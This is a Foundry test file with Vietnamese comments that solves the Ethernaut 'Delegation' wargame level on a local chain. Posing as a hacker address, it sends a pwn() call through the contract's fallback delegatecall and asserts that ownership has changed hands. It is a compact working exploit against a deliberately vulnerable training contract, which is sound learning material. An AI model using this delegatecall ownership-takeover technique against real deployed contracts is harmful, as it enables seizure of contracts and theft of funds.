// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegation.sol"; // Import code từ src

contract DelegationTest is Test {
    Delegate public delegateContract;
    Delegation public delegationContract;

    address public hacker = address(0x1337); // Giả lập ví hacker của bạn
    address public deployer = address(0x9999);

    function setUp() public {
        // Giả lập deploy các hợp đồng giống hệ thống Ethernaut
        vm.startPrank(deployer);
        delegateContract = new Delegate(deployer);
        delegationContract = new Delegation(address(delegateContract));
        vm.stopPrank();
    }

    function testExploitLocal() public {
        // Xác nhận ban đầu owner đang là deployer, không phải hacker
        assertEq(delegationContract.owner(), deployer);

        // Bắt đầu đóng vai hacker để tấn công
        vm.startPrank(hacker);

        // Kích hoạt cuộc gọi tấn công
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegationContract).call(payload);
        require(success, "Tan cong that bai");

        vm.stopPrank();

        // Kiểm tra xem sau khi hack, owner đã biến thành hacker chưa
        assertEq(delegationContract.owner(), hacker);
        console.log(
            "Hack local thanh cong! Chu so huu moi la:",
            delegationContract.owner()
        );
    }
}
